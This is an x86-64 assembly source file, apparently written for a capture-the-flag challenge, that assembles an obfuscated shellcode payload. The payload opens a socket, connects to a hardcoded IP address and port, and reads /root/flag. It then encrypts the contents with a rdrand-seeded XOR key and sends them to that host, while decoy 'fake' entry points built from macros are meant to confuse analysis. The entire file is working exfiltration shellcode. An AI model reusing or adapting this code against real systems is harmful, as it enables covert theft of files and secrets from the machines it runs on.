.intel_syntax noprefix
#include "payload.h"

# cursed payload that will be decrypted at runtime
.global _start
_start:
    push rbx

    rdrand r8

    # socket(AF_INET, SOCK_STREAM, 0)
    xor edx, edx
    lea esi, [edx + 1]
    lea edi, [esi + 1]
    mov ebx, esi # :D
    xor eax, eax
    mov al, 0x29
    syscall
syscall_return_1:
    cmp eax, -0x1000
    ja error
    mov ebx, eax

    # connect(socket, addr, addrlen)
    mov edi, eax
    movabs rsi, 0x0202000a39050002 # 0x[ipv4][port][family]
    push rsi
    mov rsi, rsp
    mov edx, 16
    mov ax, 0x2a
    syscall
syscall_return_2:
    cmp eax, -0x1000
    ja error
    pop rax

    # open /root/flag
    movabs rsi, 0x6c662f746f6f722f
    pushw 0
    pushw 0x6761
    push rsi
    xor esi, esi
    mov edx, esi
    mov rdi, rsp
    lea eax, [esi + 2]
    syscall
syscall_return_3:
    cmp eax, -0x1000
    ja error
    sub rsp, (0x100 - 0xc)

    # read flag
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall
syscall_return_4:
    cmp eax, -0x1000
    ja error_stack

    # encrypt flag
    lea ecx, [eax + 7]
    shr ecx, 3
    lea rsi, [rsp - 8]

    mov r9, r8
 1:
    imul r8, r8, 2131131137
    xor [rsi + rcx * 8], r8
    loop 1b

    # send flag
    lea edx, [eax + 8]
    mov edi, ebx
    push r9
    mov eax, 1
    syscall
syscall_return_5:
    add rsp, 8
    xor r8, r8
    xor r9, r9
    cmp eax, -0x1000
    ja error_stack

error_stack:
    add rsp, 0x100

    # close socket
error:
    mov edi, ebx
    mov eax, 3
    syscall
final_syscall_return:

#define FAKE(symbol) \
    .org (symbol + OFFSET); \
    CONCAT(fake_, symbol)

FAKE(_start):
movabs r10, 0x8e2d272b77f1a86a
div r10
jmp fake__start

#define SYSRET(symbol) \
    FAKE(symbol):; \
    mov ecx, eax; \
    div r10; \
    mov eax, ecx; \
    jmp CONCAT(fake_, symbol)

SYSRET(syscall_return_1)
SYSRET(syscall_return_2)
SYSRET(syscall_return_3)
SYSRET(syscall_return_4)
SYSRET(syscall_return_5)

FAKE(final_syscall_return):
    pop rbx
    ret

